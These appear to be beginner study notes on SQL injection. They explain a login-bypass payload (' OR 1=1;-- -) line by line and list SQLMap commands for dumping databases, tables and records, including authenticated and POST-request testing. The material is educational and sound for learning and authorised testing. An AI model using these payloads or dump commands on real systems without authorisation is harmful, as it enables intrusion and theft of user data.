# SQL Injection 

## Introduction

### What is a Database ?

A database is an organized collection of data that can be:
- Store data
- Retrieve data
- Modify data
- Delete data

It keeps information in a structured format, making data management fast and efficient.

---

## Why Do Websites Use Databases ?

Most websites need to store user or application data.

### Examples

- **Login Page**

  - Stores usernames and passwords.
  - Verifies credentials during login.

- **Shopping Website**

  - Stores products, prices, and stock.

- **Book Search**

  - Searches the database for matching books and displays the results.

Without a database, websites would have no way to remember users or store information.

---

## How a Website Communicates with a Database

```text
User
  │
  ▼
Browser
  │ HTTP Request
  ▼
Web Server / Web Application
  │
  │ Creates SQL Query
  ▼
DBMS (MySQL, PostgreSQL, SQLite, MSSQL)
  │
  ▼
Database
  │
  │ Returns Results
  ▼
Web Server / Web Application
  │
  │ Generates Response
  ▼
Browser (User Sees Output)
```

### Example

```
User enters:

Username: John
Password: pass123

        │
        ▼
Browser sends HTTP request
        │
        ▼
Web Server

Creates SQL query:

SELECT * FROM users
WHERE username='John'
AND password='pass123';

        │
        ▼
Database

Checks records
        │
        ▼
Returns matching user (or no match)
        │
        ▼
Web Server
        │
        ▼
Browser displays:
✓ Login Successful
or
✗ Invalid Username/Password

The database checks whether such a user exists and returns the result.
```
---

## What is a DBMS ?

A DBMS (Database Management System) is software that manages databases.

It understands SQL (Structured Query Language) and executes SQL queries sent by applications.

### Common DBMS

| DBMS                 | Full Form                    |
| -------------------- | ---------------------------- |
| MySQL                | My Structured Query Language |
| PostgreSQL           | PostgreSQL                   |
| SQLite               | SQLite                       |
| Microsoft SQL Server | Microsoft SQL Server         |

---

## What is SQL ?

SQL (Structured Query Language) is the language used to communicate with databases.

It allows applications to:

- Retrieve data (`SELECT`)
- Insert data (`INSERT`)
- Update data (`UPDATE`)
- Delete data (`DELETE`)
- Create databases/tables (`CREATE`)
- Remove databases/tables (`DROP`)

> Its language builds the interaction between a website and its database
---

## Why Learn This ?

Applications communicate with databases using SQL queries.

If user input is not properly validated, an attacker may manipulate these SQL queries.

This vulnerability is called SQL Injection (SQLi), which tools like SQLMap automate for testing and exploitation.

---

## Key Takeaways

- **Database** → Stores application data.
- **Website** → Sends user input to the database.
- **DBMS** → Executes SQL queries.
- **SQL** → Language used to interact with databases.
- **SQL Injection (SQLi)** → Occurs when attackers manipulate SQL queries through user input.

---

## SQL Injection (SQLi) Vulnerability

## What is SQL Injection ?

SQL Injection (SQLi) is a web vulnerability that occurs when an application does not properly validate or sanitize user input before including it in an SQL query.

This allows an attacker to inject their own SQL code, causing the database to execute unintended commands.

---

## How Login Normally Works ? 

Suppose a user enters:

**Username:** `John`

**Password:** `Un@detectable444`

The application creates the SQL query:

```sql
SELECT * FROM users
WHERE username = 'John'
AND password = 'Un@detectable444';
```

### What happens ?

- Database checks if **both** username and password match.
- If both are correct → Login successful 
- Otherwise → Login fails 

Because `AND` requires **both conditions** to be true.

---

## Vulnerable Login Example

Suppose the application **does not sanitize user input**.

Attacker enters:

**Username**

```
John
```

**Password**

```
abc' OR 1=1;-- -
```

The SQL query becomes:

```sql
SELECT * FROM users
WHERE username = 'John'
AND password = 'abc'
OR 1=1;-- -';
```

---

## How the Attack Works ?

### Step 1

Original condition:

```sql
username='John'
AND
password='abc'
```

Password is incorrect 

---

### Step 2

Injected condition:

```sql
OR 1=1
```

Since

```sql
1 = 1
```

is **always TRUE**, the entire WHERE condition becomes TRUE.

---

### Step 3

The database returns a valid user record.

The attacker is logged in **without knowing the real password**.

---

## Why `'` (Single Quote) is Important ?

The single quote (`'`) closes the original password string.

Without it:

```
abc OR 1=1
```

would simply be treated as the password.

With it:

```sql
password='abc'
OR 1=1
```

the attacker successfully injects a new SQL condition.

---

## Why `-- -` is Used ? 

`--` starts an SQL comment.

Everything after it is ignored by the database.

Example:

```sql
password='abc'
OR 1=1;-- -'
```

becomes effectively:

```sql
password='abc'
OR 1=1
```

This prevents the remaining `'` from causing a syntax error.

---

## Why the Attack Works ?

The application directly inserts user input into an SQL query without validation or parameterization.

As a result, the database executes the attacker's injected SQL instead of treating it as plain text.

---

## Impact of SQL Injection

A successful SQL Injection attack may allow an attacker to:

- Bypass authentication
- Read sensitive data
- Modify database records
- Delete data
- Execute administrative operations
- In some cases, execute OS commands (depending on DBMS configuration)

---

## Visual Flow

```
User Input
      │
      ▼
Website Creates SQL Query
      │
      ▼
Database Executes Query
      │
      ▼
If input is not sanitized
      │
      ▼
Attacker injects SQL code
      │
      ▼
Database executes attacker's SQL
      │
      ▼
Unauthorized access / data compromise
```

---

## Quick Memory Trick

- **Normal User:** Input becomes **data**.
- **Attacker:** Input becomes **SQL code**.

SQL Injection happens when the database cannot distinguish between the two.

---

## Key Points

- SQL Injection occurs due to **improper input validation/sanitization**.
- Attackers inject SQL code into application inputs.
- `'` closes the original string.
- `OR 1=1` is always TRUE and bypasses conditions.
- `--` comments out the remaining query.
- SQL Injection can lead to complete database compromise.

---

## SQLMap : Automated SQL Injection Tool

## What is SQLMap ?

**SQLMap** is an open-source command-line tool that automatically detects and exploits SQL Injection (SQLi) vulnerabilities in web applications.

Instead of manually crafting SQL injection payloads, SQLMap automates:

* Detecting SQL injection vulnerabilities
* Identifying the database type
* Enumerating databases, tables, and columns
* Dumping database contents
* Performing many advanced SQL injection techniques

---

## Why Use SQLMap ?

* Saves time compared to manual SQL injection.
* Automatically detects multiple SQLi techniques.
* Extracts databases, tables, and records.
* Supports both **GET** and **POST** requests.
* Can test authenticated pages using session cookies.
* Beginner-friendly with an interactive wizard.

---

## Basic Commands

## Help Menu

```bash
sqlmap --help
```

Displays all available options and flags.

---

## Interactive Wizard

```bash
user@ubuntu:~$ sqlmap --wizard
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u):
```

* Guides beginners step-by-step.
* Prompts for target URL and scan options.
* No need to remember every flag.

---

## Common SQLMap Workflow

```
Find Target URL
        │
        ▼
Test for SQL Injection
        │
        ▼
Identify DBMS
        │
        ▼
List Databases
        │
        ▼
List Tables
        │
        ▼
Dump Records
```

---

## Testing a GET Parameter

Example vulnerable URL:

```
http://target.com/search?cat=1
```

Scan it using:

```bash
sqlmap -u "http://target.com/search?cat=1"
```

SQLMap automatically:

* Tests the parameter (`cat`)
* Detects SQL injection
* Identifies DBMS
* Finds possible injection techniques

---

# SQL Injection Types SQLMap Can Detect

| Type                | Description                                             |
| ------------------- | ------------------------------------------------------- |
| Boolean-based Blind | Uses true/false conditions (e.g., `1=1`) to infer data. |
| Error-based         | Extracts data from database error messages.             |
| Time-based Blind    | Uses delays (e.g., `SLEEP(5)`) to infer data.           |
| UNION-based         | Uses `UNION SELECT` to retrieve database data directly. |

---

# Identify Databases

```bash
sqlmap -u "http://target.com/search?cat=1" --dbs
```

Lists all databases.

Example:

```
users
members
```

---

# List Tables

```bash
sqlmap -u "http://target.com/search?cat=1" -D users --tables
```

Where:

* `-D` → Select database
* `--tables` → List tables

Example:

```
johnath
alexas
thomas
```

---

# Dump Table Records

```bash
sqlmap -u "http://target.com/search?cat=1" -D users -T thomas --dump
```

Where:

* `-D` → Database
* `-T` → Table
* `--dump` → Extract records

Example output:

```
Name : Thomas THM
Pass : testing
```

---

# Testing Authenticated Pages (Cookies)

Some applications require login before accessing vulnerable pages.

Provide session cookies:

```bash
sqlmap -u "http://target.com/profile?id=1" --cookie="PHPSESSID=abcdef123456"
```

Common cookies:

* PHPSESSID
* JSESSIONID
* Authentication Tokens

This allows SQLMap to test pages accessible only after authentication.

---

# POST-Based SQL Injection Testing

For forms like:

* Login
* Registration
* Contact Forms

Capture the HTTP POST request (e.g., using Burp Suite), save it to a file, then run:

```bash
sqlmap -r intercepted_request.txt
```

Where:

* `-r` → Read raw HTTP request from a file.

---

# Important SQLMap Flags

| Flag          | Purpose                             |
| ------------- | ----------------------------------- |
| `-u URL`      | Target URL                          |
| `--help`      | Show all options                    |
| `--wizard`    | Interactive beginner mode           |
| `--dbs`       | List databases                      |
| `-D database` | Select database                     |
| `--tables`    | List tables                         |
| `-T table`    | Select table                        |
| `--dump`      | Dump table contents                 |
| `--cookie`    | Include session cookies             |
| `-r file`     | Test using intercepted HTTP request |

---

# GET vs POST Testing

| GET Testing                   | POST Testing                             |
| ----------------------------- | ---------------------------------------- |
| Parameters appear in the URL. | Parameters are sent in the request body. |
| Uses `-u`.                    | Uses `-r`.                               |
| Common for search pages.      | Common for login and registration forms. |

---

# Typical SQLMap Enumeration Flow

```text
Target URL
     │
     ▼
sqlmap -u URL
     │
     ▼
Detect SQL Injection
     │
     ▼
sqlmap --dbs
     │
     ▼
sqlmap -D database --tables
     │
     ▼
sqlmap -D database -T table --dump
```

---

# Quick Memory Trick

```
-u          → Scan URL
--dbs       → Databases
-D          → Database
--tables    → Tables
-T          → Table
--dump      → Dump Data
--cookie    → Authenticated Scan
-r          → Read Saved HTTP Request
--wizard    → Beginner Mode
```

---

# Key Points 

* SQLMap automates SQL Injection testing and exploitation.
* It supports both **GET** and **POST** requests.
* Session cookies can be used to test authenticated pages.
* It automatically detects the database type and suitable SQL injection techniques.
* Always use SQLMap **only on systems you own or have explicit permission to test**.
